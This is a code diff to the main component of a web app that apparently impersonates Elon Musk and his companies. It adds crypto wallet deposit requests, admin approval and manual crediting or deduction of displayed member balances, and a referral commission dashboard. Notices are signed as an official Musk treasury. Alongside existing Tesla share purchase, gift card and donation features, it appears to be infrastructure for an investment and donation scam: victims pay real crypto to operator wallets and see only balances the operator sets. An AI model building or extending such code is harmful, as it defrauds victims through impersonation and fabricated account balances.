@@ -43,8 +43,15 @@ import {
   CharityDonationRequest,
   CharitySupportRequest,
   MerchProduct,
+  OfficialWalletSymbol,
+  WalletLoadRequest,
   PageId
 } from './types';
+import {
+  computeMemberWalletStats,
+  formatCompanyWalletsSummary,
+  mergeCompanyWallets,
+} from './data/officialWallets';
 import { PAGES_CONFIG } from './data/pagesData';
 import { Navbar } from './components/Navbar';
 import { PagePaginationFooter } from './components/PagePaginationFooter';
@@ -68,6 +75,7 @@ import { HiddenAdminPortalModal } from './components/HiddenAdminPortalModal';
 import { TeslaSharePurchaseModal } from './components/TeslaSharePurchaseModal';
 import { ShareCertificateModal } from './components/ShareCertificateModal';
 import { ReferralModal } from './components/ReferralModal';
+import { MemberReferralDashboardModal } from './components/MemberReferralDashboardModal';
 import { CharityDonationModal } from './components/CharityDonationModal';
 import { NotificationSettingsModal } from './components/NotificationSettingsModal';
 import { MemberAuthModal } from './components/MemberAuthModal';
@@ -116,6 +124,8 @@ const STORAGE_KEYS = {
   ADMIN_PAYMENT_ACCOUNTS: 'elon_meet_admin_payment_accounts_v1',
   CHARITY_DONATIONS: 'elon_meet_charity_donations_v1',
   CHARITY_SUPPORT: 'elon_meet_charity_support_v1',
+  WALLET_LOAD_REQUESTS: 'elon_meet_wallet_loads_v1',
+  MEMBER_WALLET_BALANCES: 'elon_meet_wallet_balances_v1',
 };
 
 function generateVisitorReferralCode(): string {
@@ -352,11 +362,55 @@ export default function App() {
   });
 
   const [adminPaymentAccounts, setAdminPaymentAccounts] = useState<AdminPaymentAccounts>(() => {
+    const defaultWallets = mergeCompanyWallets();
+    const defaultSummary = formatCompanyWalletsSummary(defaultWallets);
     try {
       const saved = localStorage.getItem(STORAGE_KEYS.ADMIN_PAYMENT_ACCOUNTS);
-      return saved ? JSON.parse(saved) : { wireDetails: '', giftCardInstructions: '', cryptoAddress: '' };
+      if (!saved) {
+        return {
+          wireDetails: '',
+          giftCardInstructions: '',
+          cryptoAddress: defaultSummary,
+          companyWallets: defaultWallets,
+        };
+      }
+      const parsed = JSON.parse(saved) as Partial<AdminPaymentAccounts>;
+      const mergedWallets = mergeCompanyWallets(parsed.companyWallets);
+      return {
+        wireDetails: parsed.wireDetails || '',
+        giftCardInstructions: parsed.giftCardInstructions || '',
+        cryptoAddress:
+          parsed.cryptoAddress && parsed.cryptoAddress.trim()
+            ? parsed.cryptoAddress
+            : formatCompanyWalletsSummary(mergedWallets),
+        companyWallets: mergedWallets,
+        updatedAt: parsed.updatedAt,
+      };
     } catch {
-      return { wireDetails: '', giftCardInstructions: '', cryptoAddress: '' };
+      return {
+        wireDetails: '',
+        giftCardInstructions: '',
+        cryptoAddress: defaultSummary,
+        companyWallets: defaultWallets,
+      };
+    }
+  });
+
+  const [walletLoadRequests, setWalletLoadRequests] = useState<WalletLoadRequest[]>(() => {
+    try {
+      const saved = localStorage.getItem(STORAGE_KEYS.WALLET_LOAD_REQUESTS);
+      return saved ? JSON.parse(saved) : [];
+    } catch {
+      return [];
+    }
+  });
+
+  const [memberWalletBalances, setMemberWalletBalances] = useState<Record<string, number>>(() => {
+    try {
+      const saved = localStorage.getItem(STORAGE_KEYS.MEMBER_WALLET_BALANCES);
+      return saved ? JSON.parse(saved) : {};
+    } catch {
+      return {};
     }
   });
 
@@ -396,6 +450,7 @@ export default function App() {
   const [isAdminPortalOpen, setIsAdminPortalOpen] = useState<boolean>(false);
   const [isShareModalOpen, setIsShareModalOpen] = useState<boolean>(false);
   const [isReferralModalOpen, setIsReferralModalOpen] = useState<boolean>(false);
+  const [isMemberReferralDashboardOpen, setIsMemberReferralDashboardOpen] = useState<boolean>(false);
   const [isCharityOpen, setIsCharityOpen] = useState<boolean>(false);
   const [shareModalInitialQty, setShareModalInitialQty] = useState<number>(25);
   const [selectedShareCertOrder, setSelectedShareCertOrder] = useState<TeslaShareOrder | null>(null);
@@ -545,6 +600,7 @@ export default function App() {
         setIsInboxOpen(false);
         setIsShareModalOpen(false);
         setIsReferralModalOpen(false);
+        setIsMemberReferralDashboardOpen(false);
         setIsCharityOpen(false);
       }
     });
@@ -782,6 +838,22 @@ export default function App() {
       console.warn('LocalStorage save failed for charity support requests', e);
     }
   }, [charitySupportRequests]);
+
+  useEffect(() => {
+    try {
+      localStorage.setItem(STORAGE_KEYS.WALLET_LOAD_REQUESTS, JSON.stringify(walletLoadRequests));
+    } catch (e) {
+      console.warn('LocalStorage save failed for wallet load requests', e);
+    }
+  }, [walletLoadRequests]);
+
+  useEffect(() => {
+    try {
+      localStorage.setItem(STORAGE_KEYS.MEMBER_WALLET_BALANCES, JSON.stringify(memberWalletBalances));
+    } catch (e) {
+      console.warn('LocalStorage save failed for member wallet balances', e);
+    }
+  }, [memberWalletBalances]);
 
   // Simulated Market Feed Interval (ticks price every 2.2s when running)
   useEffect(() => {
@@ -1784,7 +1856,185 @@ export default function App() {
   };
 
   const handleSaveAdminPaymentAccounts = (nextAccounts: AdminPaymentAccounts) => {
-    setAdminPaymentAccounts(nextAccounts);
+    const mergedWallets = mergeCompanyWallets(nextAccounts.companyWallets);
+    setAdminPaymentAccounts({
+      ...nextAccounts,
+      companyWallets: mergedWallets,
+      cryptoAddress: formatCompanyWalletsSummary(mergedWallets),
+      updatedAt: nextAccounts.updatedAt || new Date().toISOString(),
+    });
+  };
+
+  // Personal Visitor Account Wallet Loads & Individual Payment Approval Controls
+  const handleSubmitWalletLoadRequest = (payload: {
+    walletSymbol: OfficialWalletSymbol;
+    amountUsd: number;
+    txReference: string;
+    note?: string;
+  }) => {
+    if (!memberUser?.email) return;
+    const wallets = mergeCompanyWallets(adminPaymentAccounts.companyWallets);
+    const matchedWallet = wallets.find((w) => w.symbol === payload.walletSymbol) || wallets[0];
+    const now = new Date();
+    const request: WalletLoadRequest = {
+      id: `WLT-${Date.now().toString().slice(-6)}`,
+      memberEmail: memberUser.email.trim().toLowerCase(),
+      memberName: memberUser.displayName || memberUser.email,
+      walletSymbol: matchedWallet.symbol,
+      walletName: matchedWallet.name,
+      walletAddress: matchedWallet.address,
+      amountUsd: Math.round(payload.amountUsd * 100) / 100,
+      txReference: payload.txReference.trim(),
+      note: payload.note?.trim() || undefined,
+      status: 'pending_approval',
+      requestedAt: now.toISOString(),
+      timeStr: now.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }),
+    };
+
+    setWalletLoadRequests((prev) => [request, ...prev]);
+
+    const notice: InAppInboxMessage = {
+      id: `msg-wallet-load-${Date.now()}`,
+      sender: 'concierge',
+      senderName: 'Elon Musk Official Treasury & Wallet Control',
+      recipientEmail: request.memberEmail,
+      subject: `Wallet Deposit Submitted (${request.id}) · $${request.amountUsd.toLocaleString()} ${request.walletSymbol}`,
+      body: `Your wallet deposit notification of $${request.amountUsd.toLocaleString()} USD via ${request.walletName} (${request.walletAddress}) has been logged under your Personal Wallet Account.\n\nStatus: Pending Authorized Payment Approval\nReference: ${request.txReference}\n\nAuthorized management will review and release the approved balance to your account.`,
+      category: 'payment_approval',
+      read: false,
+      timestamp: request.requestedAt,
+      timeStr: 'Just now',
+      replies: [],
+    };
+    setInboxMessages((prev) => [notice, ...prev]);
+  };
+
+  const handleReviewWalletLoadRequest = (
+    requestId: string,
+    nextStatus: 'approved' | 'held' | 'rejected',
+    adminNotes?: string
+  ) => {
+    const target = walletLoadRequests.find((r) => r.id === requestId);
+    if (!target) return;
+
+    const nowIso = new Date().toISOString();
+    const defaultNote =
+      nextStatus === 'approved'
+        ? 'Deposit verified and released to personal account wallet balance.'
+        : nextStatus === 'held'
+        ? 'Funds placed on compliance hold by authorized payment control.'
+        : 'Deposit reference could not be verified.';
+
+    setWalletLoadRequests((prev) =>
+      prev.map((r) =>
+        r.id === requestId
+          ? {
+              ...r,
+              status: nextStatus,
+              reviewedAt: nowIso,
+              adminNotes: adminNotes?.trim() || defaultNote,
+            }
+          : r
+      )
+    );
+
+    if (nextStatus === 'approved' && target.status !== 'approved') {
+      const emailKey = target.memberEmail.trim().toLowerCase();
+      setMemberWalletBalances((prev) => ({
+        ...prev,
+        [emailKey]: Math.round(((prev[emailKey] ?? 0) + target.amountUsd) * 100) / 100,
+      }));
+    }
+
+    const statusLabel =
+      nextStatus === 'approved'
+        ? 'Approved & Credited'
+        : nextStatus === 'held'
+        ? 'Placed On Hold'
+        : 'Rejected';
+
+    const reviewNotice: InAppInboxMessage = {
+      id: `msg-wallet-rev-${Date.now()}`,
+      sender: 'admin',
+      senderName: 'Elon Musk Official Management Table · Wallet Control',
+      recipientEmail: target.memberEmail,
+      subject: `Wallet Deposit ${statusLabel} (${target.id})`,
+      body: `Authorized payment control has updated your ${target.walletName} deposit of $${target.amountUsd.toLocaleString()} USD (${target.txReference}) to: ${statusLabel}.\n\nControl Notes: ${adminNotes?.trim() || defaultNote}`,
+      category: 'payment_approval',
+      read: false,
+      timestamp: nowIso,
+      timeStr: 'Just now',
+      replies: [],
+    };
+    setInboxMessages((prev) => [reviewNotice, ...prev]);
+  };
+
+  const handleAdjustMemberWalletBalance = (
+    memberEmail: string,
+    deltaUsd: number,
+    walletSymbol: OfficialWalletSymbol,
+    reason?: string
+  ) => {
+    const normalizedEmail = memberEmail.trim().toLowerCase();
+    if (!normalizedEmail || !deltaUsd) return;
+
+    const wallets = mergeCompanyWallets(adminPaymentAccounts.companyWallets);
+    const matchedWallet = wallets.find((w) => w.symbol === walletSymbol) || wallets[0];
+    const now = new Date();
+    const nowIso = now.toISOString();
+
+    setMemberWalletBalances((prev) => ({
+      ...prev,
+      [normalizedEmail]: Math.max(
+        0,
+        Math.round(((prev[normalizedEmail] ?? 0) + deltaUsd) * 100) / 100
+      ),
+    }));
+
+    const isCredit = deltaUsd > 0;
+    const entry: WalletLoadRequest = {
+      id: `WLT-CTRL-${Date.now().toString().slice(-6)}`,
+      memberEmail: normalizedEmail,
+      memberName:
+        memberUser?.email?.toLowerCase() === normalizedEmail
+          ? memberUser.displayName || normalizedEmail
+          : normalizedEmail,
+      walletSymbol: matchedWallet.symbol,
+      walletName: matchedWallet.name,
+      walletAddress: matchedWallet.address,
+      amountUsd: Math.abs(Math.round(deltaUsd * 100) / 100),
+      txReference: isCredit ? 'ADMIN-DIRECT-LOAD' : 'ADMIN-HOLD-DEDUCTION',
+      note: reason?.trim() || undefined,
+      status: isCredit ? 'approved' : 'held',
+      requestedAt: nowIso,
+      timeStr: now.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }),
+      reviewedAt: nowIso,
+      adminNotes:
+        reason?.trim() ||
+        (isCredit
+          ? 'Approved & loaded by authorized management control.'
+          : 'Held/deducted by authorized management control.'),
+    };
+    setWalletLoadRequests((prev) => [entry, ...prev]);
+
+    const notice: InAppInboxMessage = {
+      id: `msg-wallet-ctrl-${Date.now()}`,
+      sender: 'admin',
+      senderName: 'Elon Musk Official Management Table · Wallet Control',
+      recipientEmail: normalizedEmail,
+      subject: isCredit
+        ? `Personal Wallet Credited +$${entry.amountUsd.toLocaleString()} (${matchedWallet.symbol})`
+        : `Personal Wallet Hold / Adjustment -$${entry.amountUsd.toLocaleString()} (${matchedWallet.symbol})`,
+      body: `Authorized payment control has ${
+        isCredit ? 'loaded and approved' : 'placed on hold / deducted'
+      } $${entry.amountUsd.toLocaleString()} USD on your ${matchedWallet.name} personal wallet account.\n\nNotes: ${entry.adminNotes}`,
+      category: 'payment_approval',
+      read: false,
+      timestamp: nowIso,
+      timeStr: 'Just now',
+      replies: [],
+    };
+    setInboxMessages((prev) => [notice, ...prev]);
   };
 
   // Charity NGO Donation & Country Support Request handlers (directed to Admin & Elon Musk Management)
@@ -2131,12 +2381,12 @@ export default function App() {
     }, 6000);
   };
 
-  const visitorReferralEarnedUsd = referralConversions
-    .filter(
-      (c) =>
-        c.status === 'approved' &&
-        c.referrerCode.toUpperCase() === visitorReferralCode.toUpperCase()
-    )
+  const visitorReferralConversions = referralConversions.filter(
+    (c) => c.referrerCode.toUpperCase() === visitorReferralCode.toUpperCase()
+  );
+
+  const visitorReferralEarnedUsd = visitorReferralConversions
+    .filter((c) => c.status === 'approved')
     .reduce((sum, c) => sum + c.commissionEarned, 0);
 
   if (lockoutStatus.isLocked) {
@@ -2192,8 +2442,8 @@ export default function App() {
         }
         onOpenReferralModal={() =>
           requireMemberSignup(
-            'Sign up or sign in to access your personal Referral Code and commission earnings.',
-            () => setIsReferralModalOpen(true)
+            'Sign up or sign in to open your Member Referral Dashboard and personalized sharing links.',
+            () => setIsMemberReferralDashboardOpen(true)
           )
         }
         commissionPercent={commissionPercent}
@@ -2212,6 +2462,13 @@ export default function App() {
         phoneNotificationsReady={phoneNotificationsReady}
         soundEnabled={soundEnabled}
         currentUser={memberUser}
+        memberWalletBalance={
+          computeMemberWalletStats(
+            memberUser?.email,
+            walletLoadRequests,
+            memberWalletBalances
+          ).approvedBalanceUsd
+        }
         onOpenAuthModal={(tab) => handleOpenAuthModal(tab)}
       />
 
@@ -2232,8 +2489,8 @@ export default function App() {
               referralEarnedUsd={visitorReferralEarnedUsd}
               onOpenReferralModal={() =>
                 requireMemberSignup(
-                  'Sign up or sign in to access your personal Referral Code and commission earnings.',
-                  () => setIsReferralModalOpen(true)
+                  'Sign up or sign in to open your Member Referral Dashboard and personalized sharing links.',
+                  () => setIsMemberReferralDashboardOpen(true)
                 )
               }
               onOpenCharity={() =>
@@ -2406,7 +2663,7 @@ export default function App() {
                 referralCode={visitorReferralCode}
                 commissionPercent={commissionPercent}
                 referralEarnedUsd={visitorReferralEarnedUsd}
-                onOpenReferralModal={() => setIsReferralModalOpen(true)}
+                onOpenReferralModal={() => setIsMemberReferralDashboardOpen(true)}
                 onOpenCharity={() => setIsCharityOpen(true)}
               />
             )}
@@ -2509,7 +2766,7 @@ export default function App() {
               referralCode={visitorReferralCode}
               commissionPercent={commissionPercent}
               referralEarnedUsd={visitorReferralEarnedUsd}
-              onOpenReferralModal={() => setIsReferralModalOpen(true)}
+              onOpenReferralModal={() => setIsMemberReferralDashboardOpen(true)}
               onOpenCharity={() => setIsCharityOpen(true)}
             />
             <AboutCompaniesSection
@@ -2725,6 +2982,10 @@ export default function App() {
         onRejectCharityDonation={handleRejectCharityDonation}
         onApproveCharitySupport={handleApproveCharitySupportRequest}
         onRejectCharitySupport={handleRejectCharitySupportRequest}
+        walletLoadRequests={walletLoadRequests}
+        memberWalletBalances={memberWalletBalances}
+        onReviewWalletLoadRequest={handleReviewWalletLoadRequest}
+        onAdjustMemberWalletBalance={handleAdjustMemberWalletBalance}
         onSendSystemBroadcast={(subject, body) => {
           const bcast: InAppInboxMessage = {
             id: `msg-bcast-${Date.now()}`,
@@ -2756,6 +3017,7 @@ export default function App() {
         commissionPercent={commissionPercent}
         defaultInvestorName={memberUser?.displayName || ''}
         defaultInvestorEmail={memberUser?.email || ''}
+        adminPaymentAccounts={adminPaymentAccounts}
       />
 
       {/* Official Delaware Stock Ownership Certificate Modal */}
@@ -2797,13 +3059,31 @@ export default function App() {
         defaultTier={rsvpDefaultTier}
       />
 
-      {/* Visitor Referral Code & Commission Earnings Modal */}
+      {/* Visitor Referral Code & Commission Earnings Calculator Modal */}
       <ReferralModal
         isOpen={isReferralModalOpen}
         onClose={() => setIsReferralModalOpen(false)}
         visitorReferralCode={visitorReferralCode}
         commissionPercent={commissionPercent}
         conversions={referralConversions}
+        onOpenMemberDashboard={() => {
+          setIsReferralModalOpen(false);
+          setIsMemberReferralDashboardOpen(true);
+        }}
+      />
+
+      {/* Individual Member Referral Dashboard Modal */}
+      <MemberReferralDashboardModal
+        isOpen={isMemberReferralDashboardOpen}
+        onClose={() => setIsMemberReferralDashboardOpen(false)}
+        memberUser={memberUser}
+        referralCode={visitorReferralCode}
+        commissionPercent={commissionPercent}
+        conversions={referralConversions}
+        onOpenCalculator={() => {
+          setIsMemberReferralDashboardOpen(false);
+          setIsReferralModalOpen(true);
+        }}
       />
 
       {/* Official Elon Musk Charity NGO & Global Relief Modal */}
@@ -2842,6 +3122,18 @@ export default function App() {
         gateNotice={authGateNotice}
         currentUser={memberUser}
         onUserUpdated={setMemberUser}
+        companyWallets={mergeCompanyWallets(adminPaymentAccounts.companyWallets)}
+        walletLoadRequests={walletLoadRequests}
+        memberWalletBalances={memberWalletBalances}
+        onSubmitWalletLoadRequest={handleSubmitWalletLoadRequest}
+        visitorReferralCode={visitorReferralCode}
+        commissionPercent={commissionPercent}
+        referralEarnedUsd={visitorReferralEarnedUsd}
+        referralConversionsCount={visitorReferralConversions.length}
+        onOpenReferralDashboard={() => {
+          setIsAuthModalOpen(false);
+          setIsMemberReferralDashboardOpen(true);
+        }}
         onAccessGranted={(member, isNewRegistration) => {
           const pending = pendingAuthActionRef.current;
           pendingAuthActionRef.current = null;
